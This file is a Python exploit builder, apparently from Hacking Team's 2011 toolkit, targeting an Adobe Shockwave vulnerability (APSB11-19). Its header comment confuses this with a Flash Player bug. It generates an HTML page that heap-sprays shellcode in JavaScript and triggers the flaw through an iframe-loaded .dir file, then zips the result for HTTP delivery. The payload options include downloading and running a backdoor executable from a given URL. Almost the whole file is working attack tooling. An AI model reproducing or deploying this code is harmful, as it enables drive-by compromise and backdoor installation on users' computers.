#! /usr/bin/env python

#Copyright HT srl, 2011
#http://www.hackingteam.it/ for more information

#cod

#
# Adobe Flash Player ActionScript Function Arguments Array Indexing
# vupen

import os
import sys
import math
import warnings

if "." not in sys.path: sys.path.append(".")
if "encoders" not in sys.path: sys.path.append("encoders")
if "payloads" not in sys.path: sys.path.append("payloads")

import time
import struct
import random
import zlib
import copy
import zipfile
import base64
import bz2
from random import *

import x86shelldrophttp
import x86int3
import ASCIIHexWhitespace
import x86helloworld
import jscript_unicode

NAME="apsb11_19"
DESCRIPTION="Adobe Shockwave rcsL Record Processing Array Indexing Vulnerability (APSB11-19)"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Adobe"
DOCUMENTATION["Repeatability"]="One Shot"
DOCUMENTATION["Date public"] = "2011/08/09"
DOCUMENTATION["CVE Name"] = " CVE-2010-4308, CVE-2010-4309, CVE-2011-2419, CVE-2011-2420, CVE-2011-2421, CVE-2011-2422, CVE-2011-2423."
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2423"
DOCUMENTATION["Note"] = """Critical vulnerabilities have been identified in Adobe Shockwave Player 11.6.0.626 and earlier versions on the Windows and Macintosh operating systems.
These vulnerabilities could allow an attacker, who successfully exploits these vulnerabilities, to run malicious code on the affected system. 
Adobe recommends users of Adobe Shockwave Player 11.6.0.626 and earlier versions update to Adobe Shockwave Player 11.6.1.629 using the instructions provided below."""

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000","XP", "VISTA", "SEVEN"]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
"""

CHANGELOG="""

"""

DEBUGNOTES="""
"""

class exploit:
	
	infile =""
	outfile =""

	def __init__(self, backdoorPath, zipFile):
		#self.setInfo(DESCRIPTION)
		self.setVersions()
		self.r = Random()
		self.r.seed()
		self.name=NAME
		self.debugmode = dbg
		self.outputCompressed = zipFile
		self.backdoorPath = backdoorPath
		self.trigger_file = self.randfilename() + ".swf"

	"""
	return a random char from a range
	"""
	def getrandchar(self):
		chars = "q0w1e2r3t4y5u6i7o8p9a_sdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
		i = self.r.randint(0, len(chars)-1)
		return chars[i]

	"""
	return a file name (random dot html (omissis))
	"""
	def randfilename(self):
		newfilename = ""
		
		for i in range(8):
			newfilename += struct.pack('c', self.getrandchar())
				
		return newfilename
	
	def displayVersions(self):
		for v in self.versions.keys():
			print "Version %d: %s"%(v,self.versions[v][0])

	def setVersions(self):
		self.versions={}
		#name, jmp esp, writeloc, writable, shelloc
		#                                    POP/POP/RET
		self.versions[1]=("Adobe Flash Player", 0x04040404)
   
	def createShellcode(self):
		result = None
		
		if payload == 0:
			obj = x86shelldrop.x86shelldrop()
			x = obj.get(self.backdoorPath)
			#result = struct.pack('l', len(x)+4) + x
			result = x
		elif payload == 1:
			obj = x86shelldrophttp.x86shelldrophttp()
			x = obj.get(self.backdoorPath)
			result = x
		elif payload == 2:
			obj = x86helloworld.x86helloworld()
			x = obj.get()
			result = x
			
		if self.debugmode == True:
			obj = x86int3.x86int3()
			result = obj.get() + result
			
		return result

	
	def run(self):
		self.makefile()
				
		return 1

	def get_root_index_content(self):
		value = """<!DOCTYPE html>
<html>
    <head>
        <script type="text/javascript">
            var shellcode = "#{shellcode}";
        </script>
    
        <script type="text/javascript">
            
            window.onload = function()
            {
                var S = BuildBlock(dword(0x90909090), 0xF0000);
                
                for(k=[],i=0;i<400;i++)
                {
                    k[i] = [S.substr(shellcode.length) + shellcode].join("");
                }
                trigger();
            }
            
            function trigger()
            {
                document.body.innerHTML += '<iframe width="1000px" height="1000px" src="exploit.dir"></iframe>';
            }
        </script>
        
        <script type="text/javascript">
            function dword(a)
            {
                return String.fromCharCode(a & 0xFFFF) + String.fromCharCode(a >> 16);
            }
        
            function BuildBlock(b, s)
            {
                while(b.length * 2 < s) { b += b; }
                return b.substring(0,  s / 2);
            }     
        </script>

    </head>
    
    <body>
        
    </body>
</html>"""

		adapter = jscript_unicode.jscript_unicode()
		shellcode = self.createShellcode()
		shellcode = adapter.get2(shellcode, "\u")
		
		html = value.replace("#{shellcode}", shellcode)

		return html

	def makefile(self):
	
		html_index = self.get_root_index_content()
		
		with warnings.catch_warnings():
			warnings.simplefilter('ignore')
			tmp_index = os.tempnam()
			tmp_shellcode = os.tempnam()
		
		f = open(tmp_index,mode='wb')
		f.write(html_index)
		f.close()
		
		f = open(tmp_shellcode,mode='wb')
		f.write(self.createShellcode())
		f.close()
		
		# Create the output archive
		print "Creating %s zip file archive"%(self.outputCompressed)
		zip = zipfile.ZipFile(self.outputCompressed, "w", zipfile.ZIP_DEFLATED)
		
		print "Adding index file"
		zip.write(tmp_index, "index.html")
		
		print "Adding dir  from resources"
		zip.write("resources/apsb11_19.dir", "exploit.dir")

		
		#if extraPath != None:
		#	print "Adding copy of backdoor"
		#	zip.write(extraPath, "backdoor.exe")

		zip.close()
		
		try:
			os.unlink(tmp_index)
			os.unlink(tmp_shellcode)
		except WindowsError:
			print "I/O error when deleting temp. files"
			
		return 1


if __name__=='__main__':
	dbg = False
	http = False
	
	if len(sys.argv) < 3:
		print "[ERROR] %s require 3 parameters"%(DESCRIPTION)
		print "[-INFO] {payload:[http|local|debug]} [localbackdoor|urltodownload] output"
		sys.exit(0)

	# Parse payload section
	if sys.argv[1].split(':')[0] != "payload":
		print "[ERROR] First parameters must be payload"
		sys.exit(0)
	else:
		requiredpayload = sys.argv[1].split(':')[1]	
		if requiredpayload == "http":
			print "[HTTP] Using HTTP reverse connect to download exe"
			payload = 1
			http = True
			#if len(sys.argv) > 3:
			#	extraPath = sys.argv[4]
			#else:
			#	extraPath = None
				
		elif requiredpayload == "debug":
			print "[DEBUG] Using INT3 exploit mode"
			payload = 0
			dbg = True
		elif requiredpayload == "local":
			print "[LOCAL] Run from %currdir%"
			payload = 2
		else:
			print "[ERROR] Unknown payload defined"
			sys.exit(0)
	
	# Interprete section
	
	if http == False:
		if os.path.isfile(sys.argv[3]) == False:
			print "[ERROR] File %s doesn't exists."%(sys.argv[3])
			sys.exit(0)

		if os.path.getsize(sys.argv[3]) == 0:
			print "[ERROR] File %s has length zero."%(sys.argv[3])
			sys.exit(0)

	#if os.path.isfile("resources/blank.pdf") == False:
	#	print "[ERROR] resources/blank.pdf not found"
	#	sys.exit(0)
	
	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)

	app=exploit(sys.argv[2], sys.argv[3])
	app.run()
	
	print ' ... done'
